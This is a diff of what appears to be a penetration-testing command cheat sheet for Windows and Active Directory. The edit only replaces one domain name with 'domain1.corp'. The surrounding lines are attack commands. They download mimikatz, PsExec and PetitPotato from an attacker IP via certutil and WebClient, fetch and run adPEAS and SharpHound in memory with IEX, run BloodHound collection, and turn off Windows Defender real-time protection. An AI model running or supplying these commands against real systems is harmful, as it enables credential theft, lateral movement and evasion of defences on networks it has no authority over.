@@ -27,14 +27,14 @@ certutil.exe -f -urlcache -split http://192.168.49.123/mimikatz.exe
 
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.123/adPEAS-Light.ps1'); Invoke-adPeas -Outputfile result-adpeas.txt
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.123/SharpHound.ps1'); 
-Invoke-BloodHound -CollectionMethod All -Domain spartancybersec.corp -ZipFileName luna.zip
+Invoke-BloodHound -CollectionMethod All -Domain domain1.corp -ZipFileName luna.zip
 
 
 (New-Object System.Net.WebClient).DownloadFile('http://192.168.49.123/PsExec64.exe', 'c:\Users\Public\PsExec64.exe')
 (New-Object System.Net.WebClient).DownloadFile('http://192.168.49.123/PetitPotato.exe', 'c:\Users\Public\PetitPotato.exe')
 
 certutil.exe -f -urlcache -split http://192.168.49.123/SharpHound.exe
-.\SharpHound.exe --CollectionMethods All --Domain spartancybersec.corp
+.\SharpHound.exe --CollectionMethods All --Domain domain1.corp
 
 Set-MpPreference -DisableIOAVProtection $true -Verbose
 Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
